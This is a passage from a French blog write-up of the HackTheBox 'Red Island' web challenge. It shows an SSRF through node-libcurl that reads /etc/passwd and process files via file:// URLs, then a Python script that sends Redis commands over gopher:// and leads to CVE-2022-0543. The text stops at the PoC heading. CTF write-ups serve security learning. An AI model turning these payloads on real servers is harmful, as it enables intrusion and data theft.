<!doctype html><html lang=fr dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Résumé api/red/generate endpoint est vulnerable au attaque SSRF, la requête envoyé est traité par la bibliothèque node-libcurl. Elle peut être utilisé avec beaucoup de protocoles ce qui permet d’investiguer le processus courant :\nfile:///proc/self/cmdline file:///proc/self/pwd/index.js L&rsquo;implementation de Redis permet l&rsquo;utilisation du protocole gopher, la version retourné 5.0.7 vulnerable à la CVE-2022-0543.\nIntroduction Ce que j&rsquo;ai appris SSRF de base avec cross-protocol scripting (gopher:// schema). Interaction Redis avec Lua sandbox escape. Première utilisation de l&rsquo;outil Caido. Aperçu général Aucun code source n&rsquo;est fourni avec ce défi, j&rsquo;ai donc directement testé l&rsquo;application web après m&rsquo;être connecté. J&rsquo;ai soumis un URL valide d&rsquo;une image, ce qui a eu pour effet de rendre une image saturé de rouge.\n"><title>Red Island</title>
<link rel=canonical href=https://wiloti.github.io/fr/p/red_island/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="Red Island"><meta property='og:description' content="Résumé api/red/generate endpoint est vulnerable au attaque SSRF, la requête envoyé est traité par la bibliothèque node-libcurl. Elle peut être utilisé avec beaucoup de protocoles ce qui permet d’investiguer le processus courant :\nfile:///proc/self/cmdline file:///proc/self/pwd/index.js L&rsquo;implementation de Redis permet l&rsquo;utilisation du protocole gopher, la version retourné 5.0.7 vulnerable à la CVE-2022-0543.\nIntroduction Ce que j&rsquo;ai appris SSRF de base avec cross-protocol scripting (gopher:// schema). Interaction Redis avec Lua sandbox escape. Première utilisation de l&rsquo;outil Caido. Aperçu général Aucun code source n&rsquo;est fourni avec ce défi, j&rsquo;ai donc directement testé l&rsquo;application web après m&rsquo;être connecté. J&rsquo;ai soumis un URL valide d&rsquo;une image, ce qui a eu pour effet de rendre une image saturé de rouge.\n"><meta property='og:url' content='https://wiloti.github.io/fr/p/red_island/'><meta property='og:site_name' content='Wiloti'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='HackTheBox'><meta property='article:tag' content='Challenge'><meta property='article:tag' content='Web'><meta property='article:published_time' content='2024-06-06T00:00:00+00:00'><meta property='article:modified_time' content='2024-06-06T00:00:00+00:00'><meta property='og:image' content='https://wiloti.github.io/p/red_island/cover.png'><meta name=twitter:title content="Red Island"><meta name=twitter:description content="Résumé api/red/generate endpoint est vulnerable au attaque SSRF, la requête envoyé est traité par la bibliothèque node-libcurl. Elle peut être utilisé avec beaucoup de protocoles ce qui permet d’investiguer le processus courant :\nfile:///proc/self/cmdline file:///proc/self/pwd/index.js L&rsquo;implementation de Redis permet l&rsquo;utilisation du protocole gopher, la version retourné 5.0.7 vulnerable à la CVE-2022-0543.\nIntroduction Ce que j&rsquo;ai appris SSRF de base avec cross-protocol scripting (gopher:// schema). Interaction Redis avec Lua sandbox escape. Première utilisation de l&rsquo;outil Caido. Aperçu général Aucun code source n&rsquo;est fourni avec ce défi, j&rsquo;ai donc directement testé l&rsquo;application web après m&rsquo;être connecté. J&rsquo;ai soumis un URL valide d&rsquo;une image, ce qui a eu pour effet de rendre une image saturé de rouge.\n"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://wiloti.github.io/p/red_island/cover.png'><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Afficher le menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/fr/><img src=/img/avatar_hu5829989843770540588.png width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/fr>Wiloti</a></h1><h2 class=site-description>Pentester</h2></div></header><ol class=menu-social><li><a href=https://github.com/wiloti target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://app.hackthebox.com/profile/618895 target=_blank title="Hack The Box" rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-cube"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M21 16.008V7.99a1.98 1.98.0 00-1-1.717l-7-4.008a2.016 2.016.0 00-2 0L4 6.273c-.619.355-1 1.01-1 1.718v8.018c0 .709.381 1.363 1 1.717l7 4.008a2.016 2.016.0 002 0l7-4.008c.619-.355 1-1.01 1-1.718z"/><path d="M12 22V12"/><path d="M12 12l8.73-5.04"/><path d="M3.27 6.96 12 12"/></svg></a></li><li><a href='https://www.root-me.org/Wiloti?lang=en' target=_blank title="Root Me" rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-skull"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 4c4.418.0 8 3.358 8 7.5.0 1.901-.755 3.637-2 4.96V19a1 1 0 01-1 1H7a1 1 0 01-1-1v-2.54c-1.245-1.322-2-3.058-2-4.96C4 7.358 7.582 4 12 4z"/><path d="M10 17v3"/><path d="M14 17v3"/><path d="M9 11m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M15 11m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/fr/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Accueil</span></a></li><li><a href=/fr/categories/><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-folder"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 4h4l3 3h7a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V6a2 2 0 012-2"/></svg>
<span>Categories</span></a></li><li><a href=/fr/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li class=menu-bottom-section><ol class=menu><li id=i18n-switch><svg class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg>
<select name=language title=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://wiloti.github.io/>English</option><option value=https://wiloti.github.io/fr/ selected>Français</option></select></li><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Mode sombre</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table des matières</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#introduction>Introduction</a><ol><li><a href=#ce-que-jai-appris>Ce que j&rsquo;ai appris</a></li></ol></li><li><a href=#aperçu-général>Aperçu général</a></li><li><a href=#enumeration>Enumeration</a><ol><li><a href=#ssrf-avec-node-libcurl><strong>SSRF</strong> avec node-libcurl</a></li><li><a href=#redis-et-gopher><em>Redis</em> et gopher</a></li></ol></li><li><a href=#exploitation>Exploitation</a><ol><li><a href=#why>Why?</a></li><li><a href=#poc>PoC</a></li></ol></li><li><a href=#references>References</a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/fr/p/red_island/><img src=/p/red_island/cover_hu12437192920852985408.png srcset="/p/red_island/cover_hu12437192920852985408.png 800w, /p/red_island/cover_hu13200563727516155608.png 1600w" width=800 height=450 loading=lazy alt="Featured image of post Red Island"></a></div><div class=article-details><header class=article-category><a href=/fr/categories/write-ups/ style=background-color:#638889;color:#fff>Write-ups</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/fr/p/red_island/>Red Island</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Jun 06, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>5 minutes de lecture</time></div></footer><footer class=article-translations><svg class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><div><a href=https://wiloti.github.io/p/red_island/ class=link>English</a></div></footer></div></header><section class=article-content><h1 id=résumé><a href=#r%c3%a9sum%c3%a9 class=header-anchor></a>Résumé</h1><p><code>api/red/generate</code> endpoint est vulnerable au attaque <strong>SSRF</strong>, la requête envoyé est traité par la bibliothèque <em>node-libcurl</em>. Elle peut être utilisé avec beaucoup de protocoles ce qui permet d’investiguer le processus courant :</p><ul><li><code>file:///proc/self/cmdline</code></li><li><code>file:///proc/self/pwd/index.js</code></li></ul><p>L&rsquo;implementation de <em>Redis</em> permet l&rsquo;utilisation du protocole <code>gopher</code>, la version retourné <em>5.0.7</em> vulnerable à la <strong><a class=link href=https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md target=_blank rel=noopener>CVE-2022-0543</a></strong>.</p><h2 id=introduction><a href=#introduction class=header-anchor></a>Introduction</h2><h3 id=ce-que-jai-appris><a href=#ce-que-jai-appris class=header-anchor></a>Ce que j&rsquo;ai appris</h3><ul><li><strong>SSRF</strong> de base avec <strong>cross-protocol scripting</strong> (<code>gopher://</code> schema).</li><li>Interaction <em>Redis</em> avec <em>Lua</em> sandbox escape.</li><li>Première utilisation de l&rsquo;outil <em>Caido</em>.</li></ul><h2 id=aperçu-général><a href=#aper%c3%a7u-g%c3%a9n%c3%a9ral class=header-anchor></a>Aperçu général</h2><p>Aucun code source n&rsquo;est fourni avec ce défi, j&rsquo;ai donc directement testé l&rsquo;application web après m&rsquo;être connecté. J&rsquo;ai soumis un <em>URL</em> valide d&rsquo;une image, ce qui a eu pour effet de rendre une image saturé de rouge.</p><p><img src=/red_island/screenshots/valid_image_url.png loading=lazy alt="valid image url"></p><p>Il n&rsquo;y avait pas grand-chose d&rsquo;autre à faire avec l&rsquo;application, c&rsquo;était la seul interaction possible qu&rsquo;un utilisateur pouvais faire.</p><h2 id=enumeration><a href=#enumeration class=header-anchor></a>Enumeration</h2><p>Pour la première fois j&rsquo;ai utilisé l&rsquo;outil <a class=link href=https://caido.io/ target=_blank rel=noopener>Caido</a>, qui est une alternative prometteuse de <a class=link href=https://portswigger.net/burp target=_blank rel=noopener>Burp Suite</a>. J&rsquo;ai envoyé la requête dans mon onglet <em>Replay</em> pour commencer à testé mon endpoint.</p><h3 id=ssrf-avec-node-libcurl><a href=#ssrf-avec-node-libcurl class=header-anchor></a><strong>SSRF</strong> avec node-libcurl</h3><p>Pour tester si l&rsquo;application était vulnerable à une <strong><a class=link href=https://portswigger.net/web-security/ssrf target=_blank rel=noopener>Server-Side Request Forgery</a></strong>, J&rsquo;ai tout d&rsquo;abord envoyé un <em>URL</em> qui n&rsquo;etait pas une image. Si l&rsquo;application traite la demande correctement, elle aurait dû renvoyer un message d&rsquo;erreur. Or, ce n&rsquo;était pas tout à fait le cas&mldr;</p><p><img src=/red_island/screenshots/valid_url_ssrf.png loading=lazy alt=valid_url_ssrf></p><p>J&rsquo;ai bien reçu un message d&rsquo;erreur, mais en incluant le corps du lien envoyé.</p><p><img src=/red_island/screenshots/SSRF_Diagram.png loading=lazy alt="SSRF Diagram"></p><p>Ce diagramme résume ce qui se passe pendant une attaque <strong>SSRF</strong> de base. L&rsquo;entrée est toujours fiable et renvoyée. Si ce type d&rsquo;entrée utilisateur est autorisé, la gestion des erreurs et la validation des entrées doivent être renforcées pour n&rsquo;autoriser que certains domaines et renvoyer des messages d&rsquo;erreur appropriés.</p><p>Pour en savoir un peu plus sur la façon dont la demande a été traitée du côté du serveur, je me suis servi de <a class=link href=https://app.interactsh.com/#/ target=_blank rel=noopener>interactsh</a> pour identifier la bibliothèque utilisée.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>nblwybgjkdkdtwjedhnb54rribbndgeea.oast.fun</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>node-libcurl/2.3.4</span>
</span></span></code></pre></td></tr></table></div></div><p>la bibliothèque utilisée est <a class=link href=https://www.npmjs.com/package/node-libcurl target=_blank rel=noopener>node-libcurl</a>, qui supporte une large quantité de protocoles.</p><blockquote><p>libcurl is a free and easy-to-use client-side URL transfer library, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP. libcurl supports SSL certificates, HTTP POST, HTTP PUT, FTP uploading, HTTP form based upload, proxies, cookies, user+password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), file transfer resume, http proxy tunneling and more!</p><ul><li><cite>Official description of the <em>node-libcurl</em> library</cite></li></ul></blockquote><p>En prenant en compte cela, j&rsquo;ai tenté de lire un fichier local en utilisant le schéma <code>file://</code>.</p><p><img src=/red_island/screenshots/poc_reading_file_with_ssrf.png loading=lazy alt="reading /etc/passwd"></p><h3 id=redis-et-gopher><a href=#redis-et-gopher class=header-anchor></a><em>Redis</em> et gopher</h3><p>Pour en savoir plus sur l&rsquo;application web en cours d&rsquo;exécution, j&rsquo;ai lu le fichier <code>/proc/self/cmdline</code>, qui contient la commande utilisée pour démarrer l&rsquo;application.</p><p><img src=/red_island/screenshots/reading_current_process.png loading=lazy alt="current process running"></p><p>Ensuite, j&rsquo;ai voulu lire le contenu du fichier <code>index.js</code> situé dans <code>/proc/self/cwd/index.js</code>.</p><p><img src=/red_island/screenshots/reading_content_current_process.png loading=lazy alt="current process running"></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span><span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span><span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>session</span><span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express-session&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>RedisStore</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;connect-redis&#34;</span><span class=p>)(</span><span class=nx>session</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>cookieParser</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;cookie-parser&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>nunjucks</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;nunjucks&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>routes</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;./routes&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>Database</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;./database&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=p>{</span> <span class=nx>createClient</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;redis&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>redisClient</span><span class=o>=</span> <span class=nx>createClient</span><span class=p>({</span> <span class=nx>legacyMode</span><span class=o>:</span> <span class=kc>true</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>db</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Database</span><span class=p>(</span><span class=s1>&#39;/tmp/redisland.db&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=nx>json</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>cookieParser</span><span class=p>());</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>redisClient</span><span class=p>.</span><span class=nx>connect</span><span class=p>().</span><span class=k>catch</span><span class=p>(</span><span class=nx>console</span><span class=p>.</span><span class=nx>error</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>SNIP</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p><a class=link href=https://redis.io/ target=_blank rel=noopener>Redis</a> ou <strong>RE</strong>mote <strong>DI</strong>ctionary <strong>S</strong>erver est un service populaire de mise en cache de données en mémoire, Souvent utilisé comme base de données.</p><p>Dans cette application, <em>Redis</em> est utilisé comme <em>stockage des sessions</em> avec <code>redisClient.connect()</code>. En l&rsquo;absence d&rsquo;options, j&rsquo;ai supposé qu&rsquo;il était connecté à l&rsquo;adresse locale <code>localhost:6379</code>.</p><p>Je sais que <em>Redis</em> implémente <a class=link href=https://fr.wikipedia.org/wiki/Gopher target=_blank rel=noopener>gopher</a>, qui était une alternative au <a class=link href=https://fr.wikipedia.org/wiki/World_Wide_Web target=_blank rel=noopener>World Wide Web</a> dans la fin des années 90.</p><p>Etant donné que <em>node-libcurl</em> supporte plusieurs protocoles pour la <strong>SSRF</strong>, et que <em>gopher</em> peut être utilisé pour communiquer avec le client <em>Redis</em>, j&rsquo;ai effectué une attaque <strong>Cross-Protocol Scripting</strong> en utilisant le schéma <code>gopher://</code>.</p><p><img src=/red_island/screenshots/uri_gopher.png loading=lazy alt=URI></p><p>Pour automatiser cette opération, j&rsquo;ai écrit un script python:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib.parse</span> <span class=kn>import</span> <span class=n>quote</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://&lt;TARGET:HOST&gt;/api/red/generate&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>quote</span><span class=p>(</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>INFO
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>quit
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>input</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;url&#34;</span><span class=p>:</span><span class=sa>f</span><span class=s2>&#34;gopher://localhost:6379/_</span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>           <span class=s2>&#34;Content-Type&#34;</span><span class=p>:</span> <span class=s2>&#34;application/json&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>           <span class=s2>&#34;Cookie&#34;</span><span class=p>:</span> <span class=s2>&#34;connect.sid=&lt;SESSION_COOKIE&gt;&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>request</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>URL</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=nb>input</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=p>())</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>n&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>r&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>J&rsquo;ai soumis cette <em>charge utile</em> pour obtenir plus d&rsquo;informations sur l&rsquo;instance <em>Redis</em> actuelle.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-prolog data-lang=prolog><span class=line><span class=cl><span class=s>#</span> <span class=nv>Server</span>
</span></span><span class=line><span class=cl><span class=s>redis_version:</span><span class=mf>5.0.7</span>
</span></span><span class=line><span class=cl><span class=s>redis_git_sha1:</span><span class=mi>00000000</span>
</span></span><span class=line><span class=cl><span class=s>redis_git_dirty:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=s>redis_build_id:</span><span class=mi>636</span><span class=s>cde3b5c7a3923</span>
</span></span><span class=line><span class=cl><span class=s>redis_mode:standalone</span>
</span></span><span class=line><span class=cl><span class=nn>os</span><span class=p>:</span><span class=nv>Linux</span> <span class=mf>6.1.0</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=s>amd64</span> <span class=s>x86_64</span>
</span></span><span class=line><span class=cl><span class=s>arch_bits:</span><span class=mi>64</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nv>SNIP</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Une recherche de vulnérabilités dans cette version spécifique de <em>Redis</em> (5.0.7) m&rsquo;a conduit à <a class=link href=https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.md target=_blank rel=noopener>CVE-2022-0543</a>, découvert par <a class=link href=https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce target=_blank rel=noopener>Reginaldo Silva</a>.</p><h2 id=exploitation><a href=#exploitation class=header-anchor></a>Exploitation</h2><h3 id=why><a href=#why class=header-anchor></a>Why?</h3><p>Cette vulnérabilité ne provient pas directement de <em>Redis</em>. Sur certaines distributions, <em>Lua</em> est chargé dynamiquement, ce qui m&rsquo;a permis de réaliser une <strong>Remote Code Execution</strong> sur l&rsquo;hôte en échappant a la sandbox de <em>Lua</em>.</p><blockquote><p>This vulnerability existed because the Lua library in Debian/Ubuntu is provided as a dynamic library. A package variable was automatically populated that in turn permitted access to arbitrary Lua functionality.</p><ul><li><cite>Vulhub GitHub: <em>Redis Lua Sandbox Escape and Remote Code Execution (CVE-2022-0543)</em></cite></li></ul></blockquote><h3 id=poc><a href=#poc class=header-anchor></a>PoC</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
